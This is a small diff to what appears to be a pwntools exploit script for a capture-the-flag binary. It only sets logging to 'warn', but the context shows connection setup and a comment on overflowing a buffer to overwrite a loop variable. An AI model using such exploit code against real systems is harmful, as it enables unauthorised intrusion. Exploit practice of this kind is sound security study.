@@ -25,10 +25,10 @@ if len(sys.argv) > 2:
 def exploit_attempt():
     try:
         if len(HOST) > 0:
-            io = remote(HOST, PORT)
+            io = remote(HOST, PORT, level='warn')
             target_libc = ELF('../bin/libc.so.6')
         else:
-            io = target_elf.process()
+            io = target_elf.process(level='warn')
             target_libc = target_elf.libc
 
         # step 1: fill the buffer and then overwrite the LSB of the i variable to skip
